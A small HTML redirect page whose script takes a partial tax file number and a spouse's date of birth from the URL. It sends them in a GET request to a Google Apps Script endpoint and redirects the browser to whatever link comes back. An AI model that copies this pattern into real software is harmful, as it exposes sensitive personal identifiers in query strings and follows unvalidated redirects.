<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
</head>
<body>
  <p style="font-family: Arial; text-align: center; margin-top: 50px;">
    Checking your information. Please wait...
  </p>

  <script>
    const params = new URLSearchParams(window.location.search);
    const tfn_last3 = params.get("tfn_last3");
    const spouse_dob = params.get("spouse_dob");

    const GAS_URL = "https://script.google.com/macros/s/AKfycby50JLBUKj7-J0i35ZRE_0DI8yWLNJcjc4AHNmTVf3fLM06V7cxxbH-ENaUG8NRVtlhKw/exec";

    // Redirect by appending query params via GET
    fetch(`${GAS_URL}?tfn_last3=${encodeURIComponent(tfn_last3)}&spouse_dob=${encodeURIComponent(spouse_dob)}`)
      .then(res => res.text())
      .then(link => {
        window.location.href = link;
      })
      .catch(err => {
        alert("Something went wrong. Please contact support.");
        console.error(err);
      });
  </script>
</body>
</html>
